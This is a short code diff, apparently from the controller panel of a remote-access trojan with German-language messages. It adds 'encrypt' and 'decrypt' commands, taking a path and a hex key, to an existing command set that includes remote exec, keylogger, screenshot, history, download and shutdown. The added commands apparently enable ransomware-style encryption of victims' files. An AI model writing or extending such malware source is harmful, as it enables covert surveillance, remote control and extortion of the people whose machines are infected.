@@ -579,6 +579,15 @@
             case "cd":
               payload.path = argument || ".";
               break;
+            case "encrypt":
+              payload.path = argument || ".";
+              break;
+            case "decrypt": {
+              const [path, key_hex] = argument.split(" ");
+              payload.path = path || ".";
+              payload.key_hex = key_hex || "";
+              break;
+            }
             case "screenshot":
             case "systeminfo":
             case "shutdown":
@@ -586,7 +595,7 @@
               break;
             default:
               log(
-                "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, cd, systeminfo, shutdown, restart",
+                "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, cd, encrypt, decrypt, systeminfo, shutdown, restart",
                 "error"
               );
               debugLog("Unbekannter Befehl: " + action, "warn");
